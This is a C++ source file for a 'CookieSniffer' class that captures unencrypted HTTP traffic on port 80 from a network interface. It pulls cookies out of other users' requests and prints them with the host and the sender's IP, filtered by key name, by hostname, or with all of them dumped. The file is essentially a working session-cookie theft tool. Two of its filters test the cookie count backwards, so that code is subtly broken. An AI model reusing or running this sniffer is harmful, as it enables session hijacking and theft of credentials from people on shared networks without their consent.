#include "CookieSniffer.hh"

CookieSniffer::CookieSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename, const std::vector<std::string> &keys)
    : ASniffer(interface, "CookieSniffer", "tcp and dst port 80", out), _filename(filename), _type(CookieSniffer::KEYS), _hostname(""), _keys(keys)
{
}

CookieSniffer::CookieSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename, const std::string &hostname)
    : ASniffer(interface, "CookieSniffer", "tcp and dst port 80", out), _filename(filename), _type(CookieSniffer::HOST), _hostname(hostname)
{
}

CookieSniffer::CookieSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename)
    : ASniffer(interface, "CookieSniffer", "tcp and dst port 80", out), _filename(filename), _type(CookieSniffer::ALL), _hostname("all")
{
}

bool CookieSniffer::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    Tins::RawPDU::payload_type payload = tcp.rfind_pdu<RawPDU>().payload();
    std::stringstream       ss;

    for (u_int8_t data : payload)
        ss << data;

    HTTP        http(ss);

    if (_type == CookieSniffer::KEYS)
        sniffKeys(http, ip.src_addr());
    else if (_type == CookieSniffer::ALL)
        sniffAll(http, ip.src_addr());
    else if (_type == CookieSniffer::HOST)
        sniffHost(http, ip.src_addr());

    return true;
}

void CookieSniffer::sniffKeys(const HTTP &http, IP::address_type ip) const
{
    std::string value;

    try
    {
        for (std::string key : _keys)
        {
            value = http.getCookie(key); // Throw exception if key not exist
            *_out << http.getHeader("Host") << " from " << ip << "\t" << key << " = " << value << std::endl;
        }
    }
    catch (std::out_of_range &e) { }
}

void CookieSniffer::sniffHost(const HTTP &http, IP::address_type ip) const
{
    try
    {
        if (_hostname == http.getHeader("Host") && !http.cookies().size())
        {
            *_out << _hostname << " from " << ip << std::endl;
            // Dump all cookies
            for (std::pair<std::string, std::string> data : http.cookies())
                *_out << "\t" << data.first << " = " << data.second << std::endl;
            *_out << std::endl;
        }
    }
    catch (std::out_of_range &e) { }
}

void CookieSniffer::sniffAll(const HTTP &http, IP::address_type ip) const
{
    try
    {
        if (!http.cookies().size())
            return ;
        *_out << http.getHeader("Host") << " from " << ip <<  std::endl;
        // Dump all cookies
        for (std::pair<std::string, std::string> data : http.cookies())
            *_out << "\t" << data.first << " = " << data.second << std::endl;
        *_out << std::endl;
    }
    catch (std::out_of_range &e) { std::cout << e.what() << std::endl; }
}

std::string CookieSniffer::info(void) const
{
    std::string     msg;

    if (_type == CookieSniffer::KEYS)
    {
        msg += "Keys = ";
        for (std::string key : _keys)
            msg += key + " ";
    }
    else if (_type == CookieSniffer::HOST)
        msg += "Hostname = " + _hostname;
    else if (_type == CookieSniffer::ALL)
        msg += "Hostname = ALL";

    return msg + ", File = " + _filename;
}

std::string CookieSniffer::help(void) { return std::string("Start CookieSniffer.\n") + "\tOptions : <all | keys | host> <filename> [keys | hostname]"; }
